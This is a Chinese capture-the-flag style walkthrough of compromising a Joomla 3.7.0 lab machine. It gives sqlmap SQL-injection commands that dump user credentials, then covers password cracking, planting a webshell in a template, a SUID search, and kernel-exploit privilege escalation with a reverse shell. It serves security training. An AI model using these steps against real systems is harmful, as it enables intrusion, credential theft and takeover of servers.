## arp-scan

使用Kali中的[arp](https://so.csdn.net/so/search?q=arp&spm=1001.2101.3001.7020)-scan工具扫描结果如下：<br />![](https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402181632720.png)

## nmap

探测使用[nmap](https://so.csdn.net/so/search?q=nmap&spm=1001.2101.3001.7020)工具端口扫描结果如下![](https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402181632726.png)
由扫描结果知开放端口只有一个:80(http默认端口)

## 访问web

访问web界面如下：![](https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402181632724.png)

## 对网站信息收集
打开插件Wappalyzer进行网站指纹识别如下：

```markdown
从指纹识别信息中提取出的信息有:
1. 内容管理系统（CMS）：Joomla # Joomla！是使用PHP语言加上MySQL数据库所开发的软件系统
2. 操作系统：Ubuntu
3. 字体脚本：Google Font API
4. Web服务器：Apache 2.4.18
5. 编程语言：PHP
6. JavaScript：JQuery 1.12.4 JQuery Migrate 1.4.1
7. 用户界面（UI）框架：Bootstrap
```

Kali中的joomscan网站扫描工具就是专门用来扫描此类网站的

`joomscan -url http://192.168.164.132`
![](https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402181632725.png)
其中joomla版本为：3.7.0

后台管理页面为：[http://192.168.164.132/administrator/](http://192.168.164.132/administrator/)

## 用户密码破解

搜索漏洞

`searchsploit joomla 3.7.0`![](https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402181632731.png)
我们查看这个sql注入的文本文档`searchsploit joomla 3.7.0 -m 42033`![](https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402181632734.png)
写的很详细，包括注入的类型和payload及使用sqlmap暴力注入

直接上sqlmap

**暴库**

`sqlmap -u "http://192.168.164.132/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]`![](https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402181632471.png)
**暴表**

`sqlmap -u "http://192.168.164.132/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering]`![](https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402181632604.png)
看到了user相关表![](https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402181632654.png)
**暴字段**

`sqlmap -u "http://192.168.164.132/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T "#__users" --columns -p list[fullordering]`![](https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402181632727.png)
**暴内容**

`sqlmap -u "http://192.168.164.132/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T "#__users" -C "username,password" --dump -p list[fullordering]`![](https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402181632976.png)
破解密码将密文保存到一个文件中使用john破解,：后面的为密码![](https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402181632028.png)
用户admin的密码为snoopy使用admin登录web

## 提权

生成木马![](https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402181632049.png)
访问[Protostar Details and Files](http://192.168.164.132/administrator/index.php?option=com_templates&view=template&id=506&file=aG9tZQ==)
点进去更改index.php的内容，写入木马![](https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402181632132.png)
保存,使用weevely连接![](https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402181632145.png)
Find查找有特殊位权限文件`find / -perm -u=s -type f 2>/dev/null`![](https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402181632201.png)
查看系统内核以及系统版本![](https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402181632668.png)
只要符合条件的都可以试一下,这里选择39772,下载![](https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402181632691.png)
记住使用方法,kali去下载这个压缩包![](https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402181632745.png)
**靶机下载**![](https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402181632904.png)
解压zip![](https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402181632918.png)
进入目录,继续解压exp

![](https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402181632934.png)
反弹shell,weevely有些不好使![](https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402181632078.png)
更换为全交互终端

`python3 -c 'import pty;pty.spawn("/bin/bash")'`

进入这个目录,运行文件![](https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402181632334.png)
等待大概1分钟,提权成功![](https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402181632353.png)
查看flag

![](https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402181632430.png)
